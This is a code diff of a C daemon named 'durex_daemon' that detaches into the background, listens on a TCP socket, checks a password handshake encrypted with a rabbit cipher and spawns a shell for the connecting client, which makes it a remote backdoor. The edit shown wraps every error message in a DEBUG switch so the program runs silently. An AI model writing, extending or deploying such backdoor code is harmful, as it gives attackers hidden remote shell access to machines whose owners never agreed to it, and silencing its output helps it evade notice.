@@ -39,7 +39,7 @@ int daemonize(char* name, char* path, char* infile, char *outfile, char *errfile
 	    exit(EXIT_FAILURE);
 	}
 	// Catch, ignore and handle signals
-    //TODO: Implement a working signal handler
+    //TODO: Implement a real signal handler
     signal(SIGCHLD, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
 	// Fork off for the second time
@@ -89,27 +89,27 @@ int setup_server(int *master_sd, int *clients_sockets, struct sockaddr_in *serve
     *master_sd = socket(AF_INET, SOCK_STREAM, 0);
 	if (*master_sd < 0)
 	{
-		printf("error opening socket\n");
+		(DEBUG) ? printf("error opening socket\n") : 0;
 		return -1;
 	}
 	// set socket options
 	if (setsockopt(*master_sd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
     {
-        printf("error setting socket options\n");
+        (DEBUG) ? printf("error setting socket options\n") : 0;
 		close(*master_sd);
 		return -1;
     }
 	// bind socket to if
     if (bind(*master_sd, (const struct sockaddr *)server_address, sizeof(*server_address)))
 	{
-		printf("error binding socket\n");
+		(DEBUG) ? printf("error binding socket\n") : 0;
 		close(*master_sd);
 		return -1;
 	}
 	// listen for connexions
 	if (listen(*master_sd, MAX_CLIENTS) < 0)
 	{
-		printf("error listening socket\n");
+		(DEBUG) ? printf("error listening socket\n") : 0;
 		close(*master_sd);
 		return -1;
 	}
@@ -144,8 +144,8 @@ int handle_connexions(int *master_sd, fd_set *readfds, int *clients_sockets)
 	{
 		if ((new_socket = accept(*master_sd, (struct sockaddr *)&client_address, &client_addr_size)) < 0)  
 		{
-			printf("error accepting connexion\n");
-			printf("%s\n", strerror(errno));
+			(DEBUG) ? printf("error accepting connexion\n") : 0;
+			(DEBUG) ? printf("%s\n", strerror(errno)) : 0;
 			return -1;
 		}
 		//add new socket to array of sockets 
@@ -167,7 +167,7 @@ int handle_connexions(int *master_sd, fd_set *readfds, int *clients_sockets)
 		//printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
 		if (generate_key(handshake))
 		{
-			printf("error generating random handshake\n");
+			(DEBUG) ? printf("error generating random handshake\n") : 0;
 			close(*master_sd);
 			return -1;
 		}
@@ -175,14 +175,14 @@ int handle_connexions(int *master_sd, fd_set *readfds, int *clients_sockets)
 		// check password
 		if (read(clients_sockets[i], buffer, 1025) < 0)
 		{
-			printf("error reading socket content\n");
+			(DEBUG) ? printf("error reading socket content\n") : 0;
 			close(*master_sd);
 			return -1;
 		}
 		buffer[16] = 0;
 		if (rabbit(handshake, KEY))
 		{
-			printf("error encrypting handshake\n");
+			(DEBUG) ? printf("error encrypting handshake\n") : 0;
 			close(*master_sd);
 			return -1;
 		}
@@ -205,7 +205,7 @@ int spawn_shell(int *clients_sockets)
 	shell_pid = fork();
 	if (shell_pid < 0)
 	{
-		printf("error fork failed\n");
+		(DEBUG) ? printf("error fork failed\n") : 0;
 		exit(EXIT_FAILURE);
 	}
 	if (shell_pid == 0)
@@ -373,7 +373,7 @@ int main(void)
 {
 	if (daemonize("durex_daemon", "/", "/dev/fd/0", "/dev/fd/1", "/dev/fd/2"))
 	{
-		printf("Failed to run daemon\n");
+		(DEBUG) ? printf("Failed to run daemon\n") : 0;
 		return EXIT_FAILURE;
 	}
 	while (1)
